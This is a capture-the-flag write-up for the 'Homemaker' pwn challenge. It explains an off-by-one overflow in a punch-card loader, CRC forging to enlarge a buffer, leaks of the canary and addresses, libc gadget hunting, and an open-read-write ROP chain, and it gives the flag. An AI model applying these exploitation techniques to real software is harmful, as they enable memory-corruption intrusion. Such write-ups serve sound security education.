# Homemaker - Pwn (Hard)

**Flag:** `sun{the_future_is_now_today_well_wait_how_are_you_reading_this}`
**Instance:** `nc sunshinectf.games 26008`, the attachment is only the `homemaker` binary, no libc.

## Challenge

A punch-card loader: send a card, the server checks a key, copies it into memory, and prints that memory out. No libc provided, no hints.

## Analysis

### Protocol

The frame is identical in both directions:
```
ESC '[' <len:u16 BE> <payload[len]> <crc8(payload)> ESC '\'
```

`crc8` (function `0x11e9`) is multiplication by `x^8` in `GF(2^8)` with the polynomial `0x12f`.
Command 1 accepts the service card, key comparison at `0x12a7` is `0x1337c35f`.
Command 2 copies the card into `mem`, command 3 prints `mem`.

### Off-by-one bug (`0x174c`)

```c
n = len - 1;
if (n > capacity) return 0xe2;
for (i = 0; i <= n; ++i) mem[i] = p[1+i]; // Writes n+1 bytes
```

The loop uses `<=` and writes exactly one extra byte. Choosing `len = 257` makes `n = 256 = capacity`. The extra byte overwrites `mem[256]`, the low byte of `capacity` (at `mem+0x100`). The overwritten value is the frame's CRC byte, which can be brute-forced to a desired value.

By editing the CRC, `capacity` is changed to `0x1FF`. A subsequent 512-byte card sets `capacity = 0x7F8`. A single payload can now cover 2041 bytes, overflowing the entire `mem` array and dispatcher stack.

### Leak (`0x1810`)

Layout of the `mem` region:

| offset | contents |
| --- | --- |
| `0x100` | `capacity` (u16) |
| `0x102` | number of cards loaded (u16) |
| `0x108` | stack canary |
| `0x110` | saved rbp -> stack address |
| `0x118` | return address -> PIE base |

Sending a read command leaks the canary, stack address, and base address.

## Solution

Though `system` is imported, `/bin/sh` is missing. Execution requires an ORW (Open-Read-Write) chain, but the binary lacks `syscall` gadgets and the libc file is unknown.

### Step 1 - Pull libc machine code off the server

Using the `emit(0, ctx, [ctx+0x100])` primitive:
- By pointing `ctx` into the `.bss` (which we can populate), we can read out the `.dynamic`, `.got`, `.data`, and `.bss` sections, leaking libc addresses for `write`, `read`, and `system`.
- By pointing `ctx` directly at the leaked `write` libc address, we can dump its machine code to find a `syscall; ret` gadget (`write+0x1779`) and a `pop rsi; ret` gadget (`write+0x1a02`). A consistent pointer offset (`0x11e790`) on the stack locates the exact libc base dynamically without needing the libc file.

### Step 2 - Setting syscall arguments without gadgets

1. After `emit` returns, `rsi = base+0x4060` (controlled emit buffer) and `rdx = len + 8` (controlled via card).
2. `read@plt` and `write@plt` load `eax = 0` / `eax = 1` internally.
3. Sending exactly 2 bytes to `read` returns 2, setting `rax = 2` (`__NR_open`).

Chain:
```
pop rdi, mema+0x600 ; 0x1810        # rsi = emit buf, rdx = 257
pop rdi, 0          ; read@plt      # read 2 bytes from user -> rax = 2
pop rsi, 0                          # O_RDONLY
pop rdi, mema+0x600                 # rdi = "/ctf/flag.txt"
syscall                             # open -> rax = fd (3)
pop rdi, mema+0x600 ; 0x1810        # rsi = buffer, rdx = 257
pop rdi, 3          ; read@plt      # read(3, buf, 257)
pop rdi, 1          ; write@plt     # write(1, buf, 257)
```

## Result

```
$ python exploit_homemaker.py 3
[+] FLAG: sun{the_future_is_now_today_well_wait_how_are_you_reading_this}
```

## Reproduce

```bash
python exploit_homemaker.py 3
```
